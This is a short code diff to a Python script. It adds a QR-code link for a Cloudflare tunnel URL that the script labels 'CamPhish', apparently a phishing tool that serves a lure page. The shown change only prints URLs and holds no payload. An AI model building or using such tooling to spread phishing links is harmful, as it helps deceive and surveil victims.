@@ -71,8 +71,12 @@ def run_cloudflare(port):
         match = re.search(r"https://[-\w]+\.trycloudflare\.com", line)
         if match:
             url = match.group(0)
+            qr_code = f"https://api.qrserver.com/v1/create-qr-code/?size=150x150&data={url}"
             print(f"{Fore.CYAN}{Style.BRIGHT}───────────────────────────────────────")
-            print(f"{Fore.GREEN}{Style.BRIGHT}[|] Cloudflare URL: {Fore.CYAN}{url}")
+            print(f"{Fore.GREEN}{Style.BRIGHT}[|] QR code URL: {Fore.CYAN}{qr_code}")
+            print(f"{Fore.CYAN}{Style.BRIGHT}───────────────────────────────────────")
+            print(f"{Fore.GREEN}{Style.BRIGHT}[|] CamPhish(Cloudflare) URL: {Fore.CYAN}{url}")
+
             break
 
 def run_ngrok(port, token):
